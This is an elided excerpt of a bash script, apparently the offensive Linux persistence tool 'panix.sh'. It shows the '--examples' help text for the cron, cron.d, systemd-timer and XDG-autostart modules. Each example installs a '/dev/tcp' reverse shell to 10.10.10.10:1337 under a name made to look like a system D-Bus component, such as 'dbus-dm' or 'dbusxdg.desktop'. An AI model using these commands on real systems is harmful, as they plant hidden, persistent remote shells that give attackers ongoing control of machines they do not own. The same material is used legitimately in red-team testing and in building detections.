	...
	while [[ "$1" != "" ]]; do
		case $1 in
			...
			--examples )
				...
				echo "sudo ./panix.sh --cron --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --daily --name \"dbus-dm_cron_job\""
				echo ""
				echo "--crond:"
				echo "sudo ./panix.sh --cron --custom --command \"* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crond --name \"dbus-dm_cron_job\""
				echo ""
				echo "--crontab:"
	...
	while [[ "$1" != "" ]]; do
		case $1 in
			...
			--examples )
				...
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --systemd --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/usr/local/lib/systemd/system/dbus-dm.service\" --timer"
				exit 0
				;;
			--help|-h)
				usage_systemd
	...
	while [[ "$1" != "" ]]; do
		case $1 in
			...
			--examples )
				...
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --xdg --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/xdg/autostart/dbusxdg.desktop\""
				exit 0
				;;
			--help|-h)
				usage_xdg
